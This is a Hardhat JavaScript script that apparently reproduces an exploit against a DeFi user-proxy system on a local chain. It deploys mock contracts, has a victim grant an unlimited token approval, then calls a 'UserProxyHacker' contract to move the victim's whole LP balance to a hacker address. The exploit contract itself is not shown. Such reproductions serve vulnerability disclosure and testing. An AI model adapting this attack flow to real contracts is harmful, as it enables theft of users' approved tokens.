const { BigNumber } = require("ethers");
const hre = require("hardhat");


const ZERO = "0x0000000000000000000000000000000000000000"
const HACKER = "0xc0b0000000000000000000000000000000000000"
const INF = BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")

async function deployContract(name, args = []) {
  const Contract = await hre.ethers.getContractFactory(name);
  const instance = await Contract.deploy(...args);
  await instance.deployed();
  console.log(name, "deployed to:", instance.address);
  return instance;
}

async function printBalance(name, token, addr) {
  console.log(name, addr, "balance:", hre.ethers.utils.formatEther(await token.balanceOf(addr)))
}

async function main() {

  const VICTIM = (await hre.ethers.getSigners())[1];

  const LpToken = await deployContract("LpToken", [VICTIM.address]);
  printBalance('Victim', LpToken, VICTIM.address);
  printBalance('Hacker', LpToken, HACKER);

  const MockUserProxyImpl = await deployContract("MockUserProxyImplementation");
  const UserProxyFactory = await deployContract("UserProxyFactory", [MockUserProxyImpl.address, []]);
  const UserProxyInterface = await deployContract("UserProxyInterface");
  const hacker = await deployContract("UserProxyHacker")

  UserProxyInterface.initialize(UserProxyFactory.address, ZERO);
  UserProxyFactory.initialize(UserProxyInterface.address, false);

  const victimToken = LpToken.connect(VICTIM);
  let tx = await victimToken.approve(UserProxyInterface.address, INF);
  await tx.wait();

  tx = await hacker.run(
    UserProxyFactory.address, 
    UserProxyInterface.address, 
    HACKER, 
    VICTIM.address, 
    LpToken.address, 
    LpToken.balanceOf(VICTIM.address)
  );
  await tx.wait();

  printBalance('Victim', LpToken, VICTIM.address);
  printBalance('Hacker', LpToken, HACKER);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
